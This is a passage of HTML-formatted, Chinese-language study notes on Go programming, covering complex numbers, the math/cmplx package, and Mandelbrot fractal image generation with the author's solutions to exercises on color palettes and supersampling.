punctuation\">)</span><span class=\"token punctuation\">)</span>           <span class=\"token comment\">// \"-5\"</span>\nfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span><span class=\"token function\">imag</span><span class=\"token punctuation\">(</span>x<span class=\"token operator\">*</span>y<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>           <span class=\"token comment\">// \"10\"</span>\n</code></pre></div><p>如果一个浮点数面值或一个十进制整数面值后面跟着一个i，例如3.141592i或2i，它将构成一个复数的虚部，复数的实部是0：</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code>fmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span><span class=\"token number\">1i</span> <span class=\"token operator\">*</span> <span class=\"token number\">1i</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// \"(-1+0i)\", i^2 = -1</span>\n</code></pre></div><p>在常量算术规则下，一个复数常量可以加到另一个普通数值常量（整数或浮点数、实部或虚部），我们可以用自然的方式书写复数，就像1+2i或与之等价的写法2i+1。上面x和y的声明语句还可以简化：</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code>x <span class=\"token operator\">:=</span> <span class=\"token number\">1</span> <span class=\"token operator\">+</span> <span class=\"token number\">2i</span>\ny <span class=\"token operator\">:=</span> <span class=\"token number\">3</span> <span class=\"token operator\">+</span> <span class=\"token number\">4i</span>\n</code></pre></div><p>复数也可以用==和!=进行相等比较。只有两个复数的实部和虚部都相等的时候它们才是相等的（译注：浮点数的相等比较是危险的，需要特别小心处理精度问题）。</p>\n<h3>math/cmplx包</h3>\n<p>math/cmplx包提供了复数处理的许多函数，例如求复数的平方根函数和求幂函数。</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code>fmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span>cmplx<span class=\"token punctuation\">.</span><span class=\"token function\">Sqrt</span><span class=\"token punctuation\">(</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// \"(0+1i)\"</span>\n</code></pre></div><p>下面的程序使用complex128复数算法来生成一个Mandelbrot图像。</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code><span class=\"token comment\">// Mandelbrot emits a PNG image of the Mandelbrot fractal.</span>\n<span class=\"token keyword\">package</span> main\n\n<span class=\"token keyword\">import</span> <span class=\"token punctuation\">(</span>\n\t<span class=\"token string\">\"image\"</span>\n\t<span class=\"token string\">\"image/color\"</span>\n\t<span class=\"token string\">\"image/png\"</span>\n\t<span class=\"token string\">\"math/cmplx\"</span>\n\t<span class=\"token string\">\"os\"</span>\n<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">func</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\t<span class=\"token keyword\">const</span> <span class=\"token punctuation\">(</span>\n\t\txmin<span class=\"token punctuation\">,</span> ymin<span class=\"token punctuation\">,</span> xmax<span class=\"token punctuation\">,</span> ymax <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">-</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">+</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">+</span><span class=\"token number\">2</span>\n\t\twidth<span class=\"token punctuation\">,</span> height          <span class=\"token operator\">=</span> <span class=\"token number\">1024</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1024</span>\n\t<span class=\"token punctuation\">)</span>\n\n\timg <span class=\"token operator\">:=</span> image<span class=\"token punctuation\">.</span><span class=\"token function\">NewRGBA</span><span class=\"token punctuation\">(</span>image<span class=\"token punctuation\">.</span><span class=\"token function\">Rect</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> width<span class=\"token punctuation\">,</span> height<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\t<span class=\"token keyword\">for</span> py <span class=\"token operator\">:=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> py <span class=\"token operator\">&lt;</span> height<span class=\"token punctuation\">;</span> py<span class=\"token operator\">++</span> <span class=\"token punctuation\">{</span>\n\t\ty <span class=\"token operator\">:=</span> <span class=\"token function\">float64</span><span class=\"token punctuation\">(</span>py<span class=\"token punctuation\">)</span><span class=\"token operator\">/</span>height<span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>ymax<span class=\"token operator\">-</span>ymin<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> ymin\n\t\t<span class=\"token keyword\">for</span> px <span class=\"token operator\">:=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> px <span class=\"token operator\">&lt;</span> width<span class=\"token punctuation\">;</span> px<span class=\"token operator\">++</span> <span class=\"token punctuation\">{</span>\n\t\t\tx <span class=\"token operator\">:=</span> <span class=\"token function\">float64</span><span class=\"token punctuation\">(</span>px<span class=\"token punctuation\">)</span><span class=\"token operator\">/</span>width<span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>xmax<span class=\"token operator\">-</span>xmin<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> xmin\n\t\t\tz <span class=\"token operator\">:=</span> <span class=\"token function\">complex</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">,</span> y<span class=\"token punctuation\">)</span>\n\t\t\t<span class=\"token comment\">// Image point (px, py) represents complex value z.</span>\n\t\t\timg<span class=\"token punctuation\">.</span><span class=\"token function\">Set</span><span class=\"token punctuation\">(</span>px<span class=\"token punctuation\">,</span> py<span class=\"token punctuation\">,</span> <span class=\"token function\">mandelbrot</span><span class=\"token punctuation\">(</span>z<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\t\t<span class=\"token punctuation\">}</span>\n\t<span class=\"token punctuation\">}</span>\n\tpng<span class=\"token punctuation\">.</span><span class=\"token function\">Encode</span><span class=\"token punctuation\">(</span>os<span class=\"token punctuation\">.</span>Stdout<span class=\"token punctuation\">,</span> img<span class=\"token punctuation\">)</span>\n\t<span class=\"token comment\">// NOTE: ignoring errors</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">func</span> <span class=\"token function\">mandelbrot</span><span class=\"token punctuation\">(</span>z <span class=\"token builtin\">complex128</span><span class=\"token punctuation\">)</span> color<span class=\"token punctuation\">.</span>Color <span class=\"token punctuation\">{</span>\n\t<span class=\"token keyword\">const</span> iterations <span class=\"token operator\">=</span> <span class=\"token number\">200</span>\n\t<span class=\"token keyword\">const</span> contrast <span class=\"token operator\">=</span> <span class=\"token number\">15</span>\n\n\t<span class=\"token keyword\">var</span> v <span class=\"token builtin\">complex128</span>\n\t<span class=\"token keyword\">for</span> n <span class=\"token operator\">:=</span> <span class=\"token function\">uint8</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> n <span class=\"token operator\">&lt;</span> iterations<span class=\"token punctuation\">;</span> n<span class=\"token operator\">++</span> <span class=\"token punctuation\">{</span>\n\t\tv <span class=\"token operator\">=</span> v<span class=\"token operator\">*</span>v <span class=\"token operator\">+</span> z\n\t\t<span class=\"token keyword\">if</span> cmplx<span class=\"token punctuation\">.</span><span class=\"token function\">Abs</span><span class=\"token punctuation\">(</span>v<span class=\"token punctuation\">)</span> <span class=\"token operator\">&gt;</span> <span class=\"token number\">2</span> <span class=\"token punctuation\">{</span>\n\t\t\t<span class=\"token comment\">// NOTE: Gray结构体里面是uint8，所以255-contrast*n范围是[0,255]，也就是图像的灰度范围</span>\n\t\t\t<span class=\"token keyword\">return</span> color<span class=\"token punctuation\">.</span>Gray<span class=\"token punctuation\">{</span><span class=\"token number\">255</span> <span class=\"token operator\">-</span> contrast<span class=\"token operator\">*</span>n<span class=\"token punctuation\">}</span>\n\t\t<span class=\"token punctuation\">}</span>\n\t<span class=\"token punctuation\">}</span>\n\t<span class=\"token keyword\">return</span> color<span class=\"token punctuation\">.</span>Black\n<span class=\"token punctuation\">}</span>\n\n</code></pre></div><p>用于遍历1024*1024图像每个点的两个嵌套的循环对应-2到+2区间的复数平面。程序反复测试每个点对应复数值平方值加一个增量值对应的点是否超出半径为2的圆。如果超过了，通过根据预设置的逃逸迭代次数对应的灰度颜色来代替。如果不是，那么该点属于Mandelbrot集合，使用黑色颜色标记。最终程序将生成的PNG格式分形图像输出到标准输出。</p>\n<figure><figcaption>image-20240415153834143</figcaption></figure>\n<blockquote>\n<p>[!NOTE]</p>\n<p>此处要用cmd执行go run mandelbrot.go &gt; out.png ，要不然powershell会出问题：</p>\n<figure><figcaption>image-20240415153609218</figcaption></figure>\n</blockquote>\n<h3>练习 3.5</h3>\n<p>实现一个彩色的Mandelbrot图像，使用image.NewRGBA创建图像，使用color.RGBA或color.YCbCr生成颜色。</p>\n<p>添加一个选择颜色的函数，替换原来的灰度，颜色参考https://stackoverflow.com/questions/16500656/which-color-gradient-is-used-to-color-mandelbrot-in-wikipedia</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code><span class=\"token keyword\">func</span> <span class=\"token function\">mandelbrot</span><span class=\"token punctuation\">(</span>z <span class=\"token builtin\">complex128</span><span class=\"token punctuation\">)</span> color<span class=\"token punctuation\">.</span>Color <span class=\"token punctuation\">{</span>\n\t<span class=\"token keyword\">const</span> iterations <span class=\"token operator\">=</span> <span class=\"token number\">200</span>\n\t<span class=\"token comment\">// const contrast = 15</span>\n\n\t<span class=\"token keyword\">var</span> v <span class=\"token builtin\">complex128</span>\n\t<span class=\"token keyword\">for</span> n <span class=\"token operator\">:=</span> <span class=\"token function\">uint8</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> n <span class=\"token operator\">&lt;</span> iterations<span class=\"token punctuation\">;</span> n<span class=\"token operator\">++</span> <span class=\"token punctuation\">{</span>\n\t\tv <span class=\"token operator\">=</span> v<span class=\"token operator\">*</span>v <span class=\"token operator\">+</span> z\n\t\t<span class=\"token keyword\">if</span> cmplx<span class=\"token punctuation\">.</span><span class=\"token function\">Abs</span><span class=\"token punctuation\">(</span>v<span class=\"token punctuation\">)</span> <span class=\"token operator\">&gt;</span> <span class=\"token number\">2</span> <span class=\"token punctuation\">{</span>\n\t\t\t<span class=\"token comment\">// return color.Gray{255 - contrast*n}</span>\n\t\t\t<span class=\"token comment\">// NOTE: 原本return灰度的地方，改成返回一个颜色</span>\n\t\t\t<span class=\"token keyword\">return</span> <span class=\"token function\">getColor</span><span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">)</span>\n\t\t<span class=\"token punctuation\">}</span>\n\t<span class=\"token punctuation\">}</span>\n\t<span class=\"token keyword\">return</span> color<span class=\"token punctuation\">.</span>Black\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">func</span> <span class=\"token function\">getColor</span><span class=\"token punctuation\">(</span>n <span class=\"token builtin\">uint8</span><span class=\"token punctuation\">)</span> color<span class=\"token punctuation\">.</span>Color <span class=\"token punctuation\">{</span>\n\tpaletted <span class=\"token operator\">:=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">16</span><span class=\"token punctuation\">]</span>color<span class=\"token punctuation\">.</span>Color<span class=\"token punctuation\">{</span>\n\t\t<span class=\"token comment\">// NOTE: type RGBA struct {R, G, B, A uint8}</span>\n\t\tcolor<span class=\"token punctuation\">.</span>RGBA<span class=\"token punctuation\">{</span><span class=\"token number\">66</span><span class=\"token punctuation\">,</span> <span class=\"token number\">30</span><span class=\"token punctuation\">,</span> <span class=\"token number\">15</span><span class=\"token punctuation\">,</span> <span class=\"token number\">255</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>    <span class=\"token comment\">// brown 3</span>\n\t\tcolor<span class=\"token punctuation\">.</span>RGBA<span class=\"token punctuation\">{</span><span class=\"token number\">25</span><span class=\"token punctuation\">,</span> <span class=\"token number\">7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">26</span><span class=\"token punctuation\">,</span> <span class=\"token number\">255</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>     <span class=\"token comment\">// dark violett</span>\n\t\tcolor<span class=\"token punctuation\">.</span>RGBA<span class=\"token punctuation\">{</span><span class=\"token number\">9</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">47</span><span class=\"token punctuation\">,</span> <span class=\"token number\">255</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>      <span class=\"token comment\">//darkest blue</span>\n\t\tcolor<span class=\"token punctuation\">.</span>RGBA<span class=\"token punctuation\">{</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">73</span><span class=\"token punctuation\">,</span> <span class=\"token number\">255</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>      <span class=\"token comment\">//blue 5</span>\n\t\tcolor<span class=\"token punctuation\">.</span>RGBA<span class=\"token punctuation\">{</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">100</span><span class=\"token punctuation\">,</span> <span class=\"token number\">255</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>     <span class=\"token comment\">//blue 4</span>\n\t\tcolor<span class=\"token punctuation\">.</span>RGBA<span class=\"token punctuation\">{</span><span class=\"token number\">12</span><span class=\"token punctuation\">,</span> <span class=\"token number\">44</span><span class=\"token punctuation\">,</span> <span class=\"token number\">138</span><span class=\"token punctuation\">,</span> <span class=\"token number\">255</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>   <span class=\"token comment\">//blue 3</span>\n\t\tcolor<span class=\"token punctuation\">.</span>RGBA<span class=\"token punctuation\">{</span><span class=\"token number\">24</span><span class=\"token punctuation\">,</span> <span class=\"token number\">82</span><span class=\"token punctuation\">,</span> <span class=\"token number\">177</span><span class=\"token punctuation\">,</span> <span class=\"token number\">255</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>   <span class=\"token comment\">//blue 2</span>\n\t\tcolor<span class=\"token punctuation\">.</span>RGBA<span class=\"token punctuation\">{</span><span class=\"token number\">57</span><span class=\"token punctuation\">,</span> <span class=\"token number\">125</span><span class=\"token punctuation\">,</span> <span class=\"token number\">209</span><span class=\"token punctuation\">,</span> <span class=\"token number\">255</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>  <span class=\"token comment\">//blue 1</span>\n\t\tcolor<span class=\"token punctuation\">.</span>RGBA<span class=\"token punctuation\">{</span><span class=\"token number\">134</span><span class=\"token punctuation\">,</span> <span class=\"token number\">181</span><span class=\"token punctuation\">,</span> <span class=\"token number\">229</span><span class=\"token punctuation\">,</span> <span class=\"token number\">255</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> <span class=\"token comment\">// blue 0</span>\n\t\tcolor<span class=\"token punctuation\">.</span>RGBA<span class=\"token punctuation\">{</span><span class=\"token number\">211</span><span class=\"token punctuation\">,</span> <span class=\"token number\">236</span><span class=\"token punctuation\">,</span> <span class=\"token number\">248</span><span class=\"token punctuation\">,</span> <span class=\"token number\">255</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> <span class=\"token comment\">// lightest blue</span>\n\t\tcolor<span class=\"token punctuation\">.</span>RGBA<span class=\"token punctuation\">{</span><span class=\"token number\">241</span><span class=\"token punctuation\">,</span> <span class=\"token number\">233</span><span class=\"token punctuation\">,</span> <span class=\"token number\">191</span><span class=\"token punctuation\">,</span> <span class=\"token number\">255</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> <span class=\"token comment\">// lightest yellow</span>\n\t\tcolor<span class=\"token punctuation\">.</span>RGBA<span class=\"token punctuation\">{</span><span class=\"token number\">248</span><span class=\"token punctuation\">,</span> <span class=\"token number\">201</span><span class=\"token punctuation\">,</span> <span class=\"token number\">95</span><span class=\"token punctuation\">,</span> <span class=\"token number\">255</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>  <span class=\"token comment\">// light yellow</span>\n\t\tcolor<span class=\"token punctuation\">.</span>RGBA<span class=\"token punctuation\">{</span><span class=\"token number\">255</span><span class=\"token punctuation\">,</span> <span class=\"token number\">170</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">255</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>   <span class=\"token comment\">// dirty yellow</span>\n\t\tcolor<span class=\"token punctuation\">.</span>RGBA<span class=\"token punctuation\">{</span><span class=\"token number\">204</span><span class=\"token punctuation\">,</span> <span class=\"token number\">128</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">255</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>   <span class=\"token comment\">// brown 0</span>\n\t\tcolor<span class=\"token punctuation\">.</span>RGBA<span class=\"token punctuation\">{</span><span class=\"token number\">153</span><span class=\"token punctuation\">,</span> <span class=\"token number\">87</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">255</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>    <span class=\"token comment\">// brown 1</span>\n\t\tcolor<span class=\"token punctuation\">.</span>RGBA<span class=\"token punctuation\">{</span><span class=\"token number\">106</span><span class=\"token punctuation\">,</span> <span class=\"token number\">52</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">255</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>    <span class=\"token comment\">// brown 2</span>\n\t<span class=\"token punctuation\">}</span>\n\t<span class=\"token keyword\">return</span> paletted<span class=\"token punctuation\">[</span>n<span class=\"token operator\">%</span><span class=\"token number\">16</span><span class=\"token punctuation\">]</span>\n\n<span class=\"token punctuation\">}</span>\n</code></pre></div><h3>练习 3.6</h3>\n<p>升采样技术可以降低每个像素对计算颜色值和平均值的影响。简单的方法是将每个像素分成四个子像素，实现它。</p>\n<p>原本使用坐标x,y直接算个颜色出来，现在是取坐标x,y四周的四个点，算出颜色的平均值（将r、g、b、a四个的值求平均）</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code><span class=\"token keyword\">package</span> main\n\n<span class=\"token keyword\">import</span> <span class=\"token punctuation\">(</span>\n\t<span class=\"token string\">\"image\"</span>\n\t<span class=\"token string\">\"image/color\"</span>\n\t<span class=\"token string\">\"image/png\"</span>\n\t<span class=\"token string\">\"math/cmplx\"</span>\n\t<span class=\"token string\">\"os\"</span>\n<span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\">// go command:</span>\n<span class=\"token comment\">// go run ./src/chapter3/work3_6/work3_6.go &gt; ./src/chapter3/work3_6/out.png</span>\n<span class=\"token keyword\">func</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\t<span class=\"token keyword\">const</span> <span class=\"token punctuation\">(</span>\n\t\txmin<span class=\"token punctuation\">,</span> ymin<span class=\"token punctuation\">,</span> xmax<span class=\"token punctuation\">,</span> ymax <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">-</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">+</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">+</span><span class=\"token number\">2</span>\n\t\twidth<span class=\"token punctuation\">,</span> height          <span class=\"token operator\">=</span> <span class=\"token number\">1024</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1024</span>\n\t\tepsX                   <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>xmax <span class=\"token operator\">-</span> xmin<span class=\"token punctuation\">)</span> <span class=\"token operator\">/</span> width\n\t\tepsY                   <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>ymax <span class=\"token operator\">-</span> ymin<span class=\"token punctuation\">)</span> <span class=\"token operator\">/</span> height\n\t<span class=\"token punctuation\">)</span>\n\t<span class=\"token comment\">// 升采样的间隔</span>\n\toffX <span class=\"token operator\">:=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">float64</span><span class=\"token punctuation\">{</span><span class=\"token operator\">-</span>epsX<span class=\"token punctuation\">,</span> epsX<span class=\"token punctuation\">}</span>\n\toffY <span class=\"token operator\">:=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">float64</span><span class=\"token punctuation\">{</span><span class=\"token operator\">-</span>epsY<span class=\"token punctuation\">,</span> epsY<span class=\"token punctuation\">}</span>\n\n\timg <span class=\"token operator\">:=</span> image<span class=\"token punctuation\">.</span><span class=\"token function\">NewRGBA</span><span class=\"token punctuation\">(</span>image<span class=\"token punctuation\">.</span><span class=\"token function\">Rect</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> width<span class=\"token punctuation\">,</span> height<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// create a 1024 * 1024 canvas</span>\n\t<span class=\"token keyword\">for</span> py <span class=\"token operator\">:=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> py <span class=\"token operator\">&lt;</span> height<span class=\"token punctuation\">;</span> py<span class=\"token operator\">++</span> <span class=\"token punctuation\">{</span>\n\t\ty <span class=\"token operator\">:=</span> <span class=\"token function\">float64</span><span class=\"token punctuation\">(</span>py<span class=\"token punctuation\">)</span><span class=\"token operator\">/</span>height<span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>ymax<span class=\"token operator\">-</span>ymin<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> ymin\n\t\t<span class=\"token keyword\">for</span> px <span class=\"token operator\">:=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> px <span class=\"token operator\">&lt;</span> width<span class=\"token punctuation\">;</span> px<span class=\"token operator\">++</span> <span class=\"token punctuation\">{</span>\n\t\t\tx <span class=\"token operator\">:=</span> <span class=\"token function\">float64</span><span class=\"token punctuation\">(</span>px<span class=\"token punctuation\">)</span><span class=\"token operator\">/</span>width<span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>xmax<span class=\"token operator\">-</span>xmin<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> xmin\n\t\t\t<span class=\"token comment\">// NOTE: 原本使用坐标x,y直接算个颜色出来，现在是取坐标x,y四周的四个点，算出颜色的平均值。</span>\n\t\t\tsubPixels <span class=\"token operator\">:=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>color<span class=\"token punctuation\">.</span>Color<span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span>\n\t\t\t<span class=\"token keyword\">for</span> i <span class=\"token operator\">:=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span> <span class=\"token punctuation\">{</span>\n\t\t\t\t<span class=\"token keyword\">for</span> j <span class=\"token operator\">:=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> j <span class=\"token operator\">&lt;</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span> j<span class=\"token operator\">++</span> <span class=\"token punctuation\">{</span>\n\t\t\t\t\tz <span class=\"token operator\">:=</span> <span class=\"token function\">complex</span><span class=\"token punctuation\">(</span>x<span class=\"token operator\">+</span>offX<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> y<span class=\"token operator\">+</span>offY<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n\t\t\t\t\tsubPixels <span class=\"token operator\">=</span> <span class=\"token function\">append</span><span class=\"token punctuation\">(</span>subPixels<span class=\"token punctuation\">,</span> <span class=\"token function\">mandelbrot</span><span class=\"token punctuation\">(</span>z<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\t\t\t\t<span class=\"token punctuation\">}</span>\n\t\t\t<span class=\"token punctuation\">}</span>\n\t\t\timg<span class=\"token punctuation\">.</span><span class=\"token function\">Set</span><span class=\"token punctuation\">(</span>px<span class=\"token punctuation\">,</span> py<span class=\"token punctuation\">,</span> <span class=\"token function\">avg</span><span class=\"token punctuation\">(</span>subPixels<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// loop every pixels set a specific color</span>\n\t\t<span class=\"token punctuation\">}</span>\n\t<span class=\"token punctuation\">}</span>\n\tpng<span class=\"token punctuation\">.</span><span class=\"token function\">Encode</span><span class=\"token punctuation\">(</span>os<span class=\"token punctuation\">.</span>Stdout<span class=\"token punctuation\">,</span> img<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">func</span> <span class=\"token function\">mandelbrot</span><span class=\"token punctuation\">(</span>z <span class=\"token builtin\">complex128</span><span class=\"token punctuation\">)</span> color<span class=\"token punctuation\">.</span>Color <span class=\"token punctuation\">{</span>\n\t<span class=\"token keyword\">const</span> iterations <span class=\"token operator\">=</span> <span class=\"token number\">200</span>\n\t<span class=\"token comment\">// const contrast = 15</span>\n\t<span class=\"token keyword\">var</span> v <span class=\"token builtin\">complex128</span>\n\t<span class=\"token keyword\">for</span> n <span class=\"token operator\">:=</span> <span class=\"token function\">uint8</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> n <span class=\"token operator\">&lt;</span> iterations<span class=\"token punctuation\">;</span> n<span class=\"token operator\">++</span> <span class=\"token punctuation\">{</span>\n\t\tv <span class=\"token operator\">=</span> v<span class=\"token operator\">*</span>v <span class=\"token operator\">+</span> z\n\t\t<span class=\"token keyword\">if</span> cmplx<span class=\"token punctuation\">.</span><span class=\"token function\">Abs</span><span class=\"token punctuation\">(</span>v<span class=\"token punctuation\">)</span> <span class=\"token operator\">&gt;</span> <span class=\"token number\">2</span> <span class=\"token punctuation\">{</span>\n\t\t\t<span class=\"token comment\">// return color.Gray{255 - contrast*n} // gray version use this</span>\n\t\t\t<span class=\"token keyword\">return</span> <span class=\"token function\">getColor</span><span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">)</span>\n\t\t<span class=\"token punctuation\">}</span>\n\t<span class=\"token punctuation\">}</span>\n\t<span class=\"token keyword\">return</span> color<span class=\"token punctuation\">.</span>Black\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token comment\">// 根据维基百科的图片，定义了16个颜色</span>\n<span class=\"token keyword\">func</span> <span class=\"token function\">getColor</span><span class=\"token punctuation\">(</span>n <span class=\"token builtin\">uint8</span><span class=\"token punctuation\">)</span> color<span class=\"token punctuation\">.</span>Color <span class=\"token punctuation\">{</span>\n\tpaletted <span class=\"token operator\">:=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">16</span><span class=\"token punctuation\">]</span>color<span class=\"token punctuation\">.</span>Color<span class=\"token punctuation\">{</span>\n\t\tcolor<span class=\"token punctuation\">.</span>RGBA<span class=\"token punctuation\">{</span><span class=\"token number\">66</span><span class=\"token punctuation\">,</span> <span class=\"token number\">30</span><span class=\"token punctuation\">,</span> <span class=\"token number\">15</span><span class=\"token punctuation\">,</span> <span class=\"token number\">255</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>    <span class=\"token comment\">// # brown 3</span>\n\t\tcolor<span class=\"token punctuation\">.</span>RGBA<span class=\"token punctuation\">{</span><span class=\"token number\">25</span><span class=\"token punctuation\">,</span> <span class=\"token number\">7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">26</span><span class=\"token punctuation\">,</span> <span class=\"token number\">255</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>     <span class=\"token comment\">// # dark violett</span>\n\t\tcolor<span class=\"token punctuation\">.</span>RGBA<span class=\"token punctuation\">{</span><span class=\"token number\">9</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">47</span><span class=\"token punctuation\">,</span> <span class=\"token number\">255</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>      <span class=\"token comment\">//# darkest blue</span>\n\t\tcolor<span class=\"token punctuation\">.</span>RGBA<span class=\"token punctuation\">{</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">73</span><span class=\"token punctuation\">,</span> <span class=\"token number\">255</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>      <span class=\"token comment\">//# blue 5</span>\n\t\tcolor<span class=\"token punctuation\">.</span>RGBA<span class=\"token punctuation\">{</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">100</span><span class=\"token punctuation\">,</span> <span class=\"token number\">255</span><span class=\"token punctuation\">}</span><span class=\"token 